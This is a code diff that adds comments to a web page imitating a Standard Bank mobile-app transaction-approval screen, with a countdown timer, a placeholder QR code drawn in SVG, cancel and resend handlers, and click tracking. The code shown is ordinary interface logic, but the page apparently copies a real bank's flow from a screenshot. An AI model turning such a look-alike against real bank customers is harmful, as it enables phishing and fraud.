@@ -367,6 +367,7 @@
             <h3 class="modal-title">Scan QR Code</h3>
             <p class="modal-text">Open your Standard Bank Mobile Banking app, select <strong>Scan QR</strong> from the menu, and point your camera at this screen.</p>
             <div class="qr-placeholder">
+                <!-- Clean SVG QR Code Representation -->
                 <svg viewBox="0 0 100 100" fill="#0040be">
                     <rect x="5" y="5" width="30" height="30" rx="3" fill="#0040be"/>
                     <rect x="10" y="10" width="20" height="20" fill="#fff"/>
@@ -380,6 +381,7 @@
                     <rect x="10" y="70" width="20" height="20" fill="#fff"/>
                     <rect x="15" y="75" width="10" height="10" fill="#0040be"/>
 
+                    <!-- Data Blocks -->
                     <rect x="42" y="10" width="8" height="8"/>
                     <rect x="42" y="24" width="8" height="8"/>
                     <rect x="10" y="42" width="8" height="8"/>
@@ -412,7 +414,8 @@
     <script src="/public/tracking.js"></script>
 
     <script>
-        const TOTAL_SECONDS = 90;
+        // Timer Logic
+        const TOTAL_SECONDS = 90; // Starting from 01:30 countdown
         let remainingSeconds = TOTAL_SECONDS;
         let timerInterval = null;
 
@@ -420,6 +423,7 @@
         const timerProgress = document.getElementById('timerProgress');
         const toast = document.getElementById('toast');
 
+        // SVG circle radius is 55 => Circumference = 2 * PI * 55 ≈ 345.57
         const CIRCUMFERENCE = 2 * Math.PI * 55;
         timerProgress.style.strokeDasharray = `${CIRCUMFERENCE}`;
 
@@ -428,8 +432,9 @@
             const seconds = remainingSeconds % 60;
             timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
 
+            // Calculate progress offset with top gap matching screenshot design
             const progressRatio = remainingSeconds / TOTAL_SECONDS;
-            const offset = CIRCUMFERENCE * (1 - progressRatio * 0.85);
+            const offset = CIRCUMFERENCE * (1 - progressRatio * 0.85); // 85% ring arc coverage to leave top gap
             timerProgress.style.strokeDashoffset = offset;
         }
 
@@ -456,6 +461,7 @@
             }, 3000);
         }
 
+        // Resend Notification Handler
         document.getElementById('resendBtn').addEventListener('click', function() {
             remainingSeconds = TOTAL_SECONDS;
             startTimer();
@@ -468,6 +474,7 @@
             }
         });
 
+        // Scan QR Code Modal Handlers
         const qrModal = document.getElementById('qrModal');
         document.getElementById('qrBtn').addEventListener('click', function() {
             qrModal.classList.add('active');
@@ -485,6 +492,7 @@
             qrModal.classList.remove('active');
         });
 
+        // Learn More Modal Handlers
         const learnModal = document.getElementById('learnModal');
         document.getElementById('learnMoreBtn').addEventListener('click', function(e) {
             e.preventDefault();
@@ -503,6 +511,7 @@
             learnModal.classList.remove('active');
         });
 
+        // Cancel Button Handler
         document.getElementById('cancelBtn').addEventListener('click', function() {
             if (window.UserTracking) {
                 UserTracking.track('app_approval_cancel_click', 'cancelBtn', {
@@ -512,8 +521,10 @@
             window.location.href = '/transaction-cancellation';
         });
 
+        // Initialize Timer on Page Load
         startTimer();
 
+        // Track page view
         if (window.UserTracking) {
             UserTracking.track('app_approval_page_view', 'card', {
                 timestamp: new Date().toISOString()
